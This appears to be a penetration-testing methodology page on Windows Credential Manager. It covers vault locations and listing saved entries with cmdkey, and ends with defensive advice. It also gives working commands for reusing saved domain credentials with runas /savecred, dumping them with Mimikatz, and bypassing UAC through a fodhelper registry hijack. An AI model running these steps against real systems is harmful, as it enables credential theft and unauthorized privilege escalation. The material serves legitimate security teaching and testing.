---
layout: page
title: "Windows Credential Manager"
subtitle: "Enumerating stored Windows credentials, reusing them with runas and extracting them with Mimikatz"
permalink: /methodology/passwords/windows-credential-manager/
---

Windows Credential Manager, the Windows vault, stores credentials that users and applications have asked the system to remember. These include web logins, network share credentials, domain logons and service tokens. The secrets are encrypted with keys protected by DPAPI, so they can be recovered only in the context of the owning user or with the right privileges. This page covers where the vault lives, how to list entries, how to reuse them, and how to extract them.

## Where the vault lives

- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
- `%ProgramData%\Microsoft\Vault\`
- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`

Each vault folder contains a `Policy.vpol` file, whose AES keys are protected by DPAPI and used to encrypt the stored entries.

| Vault type | Typical contents |
|-----------|------------------|
| Web Credentials | Website and online account logins, used by Internet Explorer and legacy Edge |
| Windows Credentials | Service tokens, domain user logons, network resources and shared folders |

## 1. Enumerate stored entries

Run `cmdkey` as the target user to list the entries in that user's vault:

```powershell
cmdkey /list
```

Key fields:

| Field | Meaning |
|-------|---------|
| Target | Resource or account the credential is for |
| Type | `Generic` for general entries, `Domain Password` for domain logons |
| User | Account the credential belongs to |
| Persistence | `Local machine persistence` means the entry survives reboots |

An entry such as `Domain:interactive=DOMAIN\USERNAME` with type `Domain Password` is the high-value finding.

## 2. Reuse a domain entry with runas

When a domain password entry exists, `runas /savecred` runs a process as that user without asking for the password:

```powershell
runas /savecred /user:DOMAIN\USERNAME cmd
```

Confirm the new context with `whoami` before continuing. This is a reuse technique and it does not reveal the password.

## 3. Extract entries with Mimikatz

Mimikatz reads the credential material from memory when run in an elevated session. Enable the debug privilege first:

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::credman
```

The output includes the username, the target domain (for example a cloud storage service) and, where recoverable, the password.

Other tools that enumerate and decrypt the same stores are SharpDPAPI, LaZagne and DonPAPI.

## 4. Elevate when needed (optional)

Some steps require a higher integrity level. The notes record a UAC bypass through `fodhelper.exe`, which abuses a per-user registry key. It modifies HKCU, so record every change and remove the keys afterwards:

```powershell
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /t REG_SZ /d "C:\Windows\System32\cmd.exe /c start powershell" /f
fodhelper.exe
```

> The fodhelper method changes user registry keys that security tools often monitor. Confirm it is permitted by the rules of engagement, and delete both values once the elevated session is no longer needed.
{: .warning }

## What to look for

- Domain Password entries for accounts other than the current user, which can be reused with `runas /savecred`.
- Generic entries that name internal systems, file shares or service accounts.
- Credentials for cloud or email services, which may be in scope for lateral movement.
- Users with saved credentials who hold administrative rights on other hosts.

## Pitfalls

- Credentials are per user. Enumerating as a standard user shows only that user's entries.
- Newer Windows builds with Credential Guard limit access to the LSASS process that Mimikatz depends on. Expect extraction to fail on hardened systems.
- Mimikatz output can contain partial secrets. Record what was recovered and what was masked.

## Defense and prevention

Avoid saving domain credentials in Credential Manager, especially on shared or administrative workstations. Enable Credential Guard where supported. Monitor for new credential entries, for `runas /savecred` use on privileged accounts, and for registry changes under `ms-settings` in HKCU. See the [password prevention](/methodology/passwords/prevention/) page for the wider controls.
